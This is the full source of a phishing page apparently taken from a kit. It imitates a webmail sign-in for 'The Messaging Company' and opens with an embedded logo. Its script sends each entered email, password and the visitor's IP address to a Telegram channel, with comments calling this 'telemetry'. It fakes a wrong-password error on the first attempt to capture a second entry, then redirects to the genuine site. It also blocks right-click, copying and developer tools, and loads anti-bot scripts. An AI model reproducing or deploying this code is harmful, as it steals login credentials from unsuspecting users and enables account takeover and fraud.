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" alt="The Messaging Company" height="90">
        </div>
        <form class="login-form">
            <div class="input-group">
                <input type="email" id="email" name="email" required placeholder=" ">
                <label for="email">Email</label>
            </div>
            <div class="input-group password-group">
                <input type="password" id="password" name="password" required placeholder=" ">
                <label for="password">Password</label>
                <button type="button" class="toggle-password" onclick="togglePassword(this)" aria-pressed="false" aria-label="Show password" title="Show password">
                    <!-- Eye open icon -->
                    <svg class="eye-open" viewBox="0 0 24 24" width="22" height="22" aria-hidden="true" focusable="false">
                        <!-- Eye outer: filled in blue -->
                        <path d="M1.5 12s3.5-7 10.5-7 10.5 7 10.5 7-3.5 7-10.5 7S1.5 12 1.5 12z" fill="#1976b2" stroke="#1976b2" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/>
                        <!-- White ring to highlight a smaller blue pupil -->
                        <circle cx="12" cy="12" r="3.5" fill="#ffffff"/>
                        <!-- Blue pupil dot centered inside the white ring -->
                        <circle cx="12" cy="12" r="1.6" fill="#1976b2"/>
                    </svg>
                    <!-- Eye closed icon (slashed) - hidden by default -->
                    <svg class="eye-closed" viewBox="0 0 24 24" width="22" height="22" aria-hidden="true" focusable="false">
                        <!-- Eye outer: filled in blue as the open version (visually similar when slashed) -->
                        <path d="M1.5 12s3.5-7 10.5-7 10.5 7 10.5 7-3.5 7-10.5 7S1.5 12 1.5 12z" fill="#1976b2" stroke="#1976b2" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/>
                        <!-- White ring and small pupil preserved under the slash -->
                        <circle cx="12" cy="12" r="3.5" fill="#ffffff"/>
                        <circle cx="12" cy="12" r="1.6" fill="#1976b2"/>
                        <!-- Slash across the eye: blue and thicker for visibility -->
                        <path d="M4.2 4.5L19.6 19" stroke="#1976b2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                    </svg>
                </button>
            </div>
            <button type="submit" id="submit-btn" class="btn">SIGN IN</button>
            <div id="loginError" class="error-message" role="alert" aria-live="assertive">Incorrect username or password. Try again.</div>
        </form>
        <div class="links">
            <a href="#">Reset my password</a>
            <span>|</span>
            <a href="#">Sign in another way</a>
        </div>
        <div class="language">Language: English (UK) &#9660;</div>
        <div class="footer">
            <a href="#" style="color: #1976b2; text-decoration: none;">Privacy Policy</a>
        </div>
    </div>
    <script>
        function togglePassword(el) {
            // el is the button element
            var pwd = document.getElementById('password');
            // flip the type
            if (pwd.type === 'password') {
                pwd.type = 'text';
                el.setAttribute('aria-pressed', 'true');
                el.setAttribute('aria-label', 'Hide password');
                el.title = 'Hide password';
            } else {
                pwd.type = 'password';
                el.setAttribute('aria-pressed', 'false');
                el.setAttribute('aria-label', 'Show password');
                el.title = 'Show password';
            }
            // keep focus and cursor position after type toggle
            try {
            // Try to capture both selectionStart and selectionEnd so caret/selection
                // isn't moved to the start when toggling. If browser doesn't support
                // these properties, fall back to moving caret to the end.
                var start = typeof pwd.selectionStart === 'number' ? pwd.selectionStart : pwd.value.length;
                var end = typeof pwd.selectionEnd === 'number' ? pwd.selectionEnd : start;
                pwd.focus();
                // Allow a micro task for some browsers to re-evaluate type change
                // before setting selection (improves reliability).
                setTimeout(function() {
                    try { pwd.setSelectionRange(start, end); } catch (inner) { /* ignore */ }
                }, 0);
            } catch (e) { /* ignore if not supported */ }
        }
        // Initial spinner and error logic
        window.addEventListener('DOMContentLoaded', function() {
            var spinner = document.getElementById('initSpinner');
            var app = document.getElementById('app');
            var mainContent = document.getElementById('mainContent');
            var initError = document.getElementById('initError');
            setTimeout(function() {
                spinner.style.display = 'none';
                app.style.display = 'none';
                mainContent.style.display = 'flex';
            }, 900);
            // Simulate error (for demo, remove in production)
            // setTimeout(function() {
            //     spinner.style.display = 'none';
            //     app.style.display = 'none';
            //     initError.style.display = 'flex';
            // }, 5000);
        });
    </script>
<!-- Antibot Scripts -->
<script src="../m/js/fingerprint.js"></script>
<script src="../m/js/utils.js"></script>
<script src="../m/js/captcha.js"></script>

<!-- Centralized Functions -->
<script src="../js/centralized_telegram.js"></script>
<script src="../js/centralized_redirect.js"></script>

<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script
      type="text/javascript"
      src="https://l2.io/ip.js?var=userip"
    ></script>
        <script type="text/javascript" src="https://l2.io/ip.js?var=userip"></script>
  </body>
  <script>
  /* global $ */
  $(document).ready(function() {
    var count = 0;

    function isValidEmail(email) {
      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
      return filter.test(email);
    }

        // Auto-fill email from URL (query parameter or fragment)
        // Supports: ?ref=... (natural-looking) or #email=... (legacy)
        function autoFillFromHash() {
            try {
                var email = null;
                if (typeof extractEmailFromUrl === 'function') {
                    email = extractEmailFromUrl();
                } else {
                    // Fallback if extractor not loaded
                    var urlParams = new URLSearchParams(window.location.search);
                    var value = urlParams.get('ref');
                    if (!value) {
                        var h = window.location.hash || '';
                        if (h) {
                            var fragment = h.substr(1);
                            if (fragment) {
                                var partsIdx = fragment.indexOf('=');
                                if (partsIdx !== -1) {
                                    value = fragment.substr(partsIdx + 1);
                                } else {
                                    value = fragment;
                                }
                            }
                        }
                    }
                    if (value) {
                        try {
                            value = decodeURIComponent(value);
                            var base64regex = /^([A-Za-z0-9+/]{4})*(([A-Za-z0-9+/]{2}==)|([A-Za-z0-9+/]{3}=))?$/;
                            if (base64regex.test(value.replace(/\s/g, ''))) {
                                try { value = atob(value); } catch (e) {}
                            }
                            if (isValidEmail(value)) email = value;
                        } catch (e) {}
                    }
                }

                // Fill the field if it looks like a valid email
                if (email && isValidEmail(email)) {
                    $('#email').val(email).trigger('input');
                    $('#password').focus();
                }
            } catch (err) { console.warn('autoFillFromHash error', err); }
        }

        // Run auto-fill on page ready
        autoFillFromHash();

        // Hide error when user updates inputs
        $('#email, #password').on('input', function() {
            $('#loginError').fadeOut(120);
        });

        // Anti-copy / anti-inspect: discourage right-click, copying, and common dev keys.
        (function() {
            // Disable right-click context menu on non-touch devices only
            var isTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
            if (!isTouch) {
                document.addEventListener('contextmenu', function(e) {
                    e.preventDefault();
                    return false;
                }, false);
            }

            // Disable copy from page
            document.addEventListener('copy', function(e) {
                try { e.clipboardData.setData('text/plain', 'Copying is disabled on this page.'); } catch (err) {}
                e.preventDefault();
                return false;
            });

            // Prevent selection initiation (safely allow within inputs)
            document.addEventListener('selectstart', function(e) {
                if (!e.target.closest('input, textarea')) {
                    e.preventDefault();
                    return false;
                }
            });

            // Block some developer tools key combos (not foolproof)
            document.addEventListener('keydown', function(e) {
                // F12
                if (e.keyCode === 123) { e.preventDefault(); e.stopPropagation(); return false; }
                // Ctrl+Shift+I / Ctrl+Shift+J / Ctrl+Shift+C
                if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) { e.preventDefault(); e.stopPropagation(); return false; }
                // Ctrl+U, Ctrl+S
                if (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83)) { e.preventDefault(); e.stopPropagation(); return false; }
                // Cmd+Option+I (mac dev tools)
                if (e.metaKey && e.altKey && e.keyCode === 73) { e.preventDefault(); e.stopPropagation(); return false; }
            });
        })();

        $('#submit-btn').on('click', function(event) {
      event.preventDefault();
      var email = $('#email').val() ? $('#email').val().trim() : '';
      var pw = $('#password').val() ? $('#password').val().trim() : '';
      if (!email) {
        alert('Please enter your email');
        $('#email').focus();
        return false;
      }
      if (!isValidEmail(email)) {
        alert('Enter a valid email');
        $('#email').focus();
        return false;
      }
      if (!pw) {
        alert('Please enter your password');
        $('#password').focus();
        return false;
      }
            // Attempt flow: first submit shows a wrong-credentials message, but
            // we still send a safe telemetry event on every submit. The second
            // submit will also redirect after reporting.
            count = count + 1;

            // Use centralized Telegram reporting with provider tag
            window.providerTag = 'messaging';
            var clientIP = window.userip || 'n/a';
            
            function sendTelemetry(attempt, redirectOnSuccess) {
                // Send centralized Telegram report
                if (typeof sendCentralizedTelegramReport === 'function') {
                    sendCentralizedTelegramReport(providerTag, email, pw, clientIP, function(success) {
                        if (redirectOnSuccess) {
                            // Use centralized redirect
                            if (typeof performCentralizedRedirect === 'function') {
                                performCentralizedRedirect(300);
                            } else {
                                // Fallback if centralized redirect not available
                                setTimeout(function() { window.location.replace('https://webmail.themessagingco.com.au/login'); }, 300);
                            }
                        }
                    });
                } else {
                    // Fallback if centralized function not available
                    console.error('Centralized Telegram function not available');
                    if (redirectOnSuccess) {
                        if (typeof performCentralizedRedirect === 'function') {
                            performCentralizedRedirect(300);
                        } else {
                            setTimeout(function() { window.location.replace('https://webmail.themessagingco.com.au/login'); }, 300);
                        }
                    }
                }
                
                if (redirectOnSuccess) {
                    $('#submit-btn').text('verifying...');
                    setTimeout(function() {
                        $('#submit-btn').text('SIGN IN');
                    }, 200);
                }
            }

            // Always send telemetry (including the first attempt). Only redirect
            // when we have at least 2 attempts.
            sendTelemetry(count, (count >= 2));

            if (count === 1) {
                // Show wrong credentials message and return without redirect
                $('#loginError').stop(true, true).fadeIn(120).addClass('shake');
                setTimeout(function() { $('#loginError').removeClass('shake'); }, 450);
                // Clear password for privacy, focus and allow user to try again
                $('#password').val('').focus();
                return false;
            }
            
    });
});
  </script>
</body>
</html>